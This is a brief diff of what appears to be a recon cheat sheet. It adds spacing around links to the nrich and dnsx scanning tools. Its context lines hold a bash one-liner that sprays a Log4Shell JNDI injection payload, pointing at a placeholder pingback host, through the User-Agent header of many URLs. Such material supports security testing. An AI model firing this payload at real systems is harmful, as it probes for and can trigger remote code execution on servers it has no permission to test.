@@ -36,7 +36,9 @@
 `while read url; do log4=$(curl -s -L $url -H User-Agent: "$\{jndi:ldap://your-pingback-client-url.com}");echo -e "$url -> User-Agent: Fired";done`
 
 # Scan Ports and Vulnerabilities CVE using nrich
+
 `https://gitlab.com/shodan-public/nrich`
+
 `https://github.com/projectdiscovery/dnsx`
 ![nrich](https://user-images.githubusercontent.com/58636452/157049702-6afd8a8a-5858-42d7-9ef4-3d94b650d69c.jpg)
 
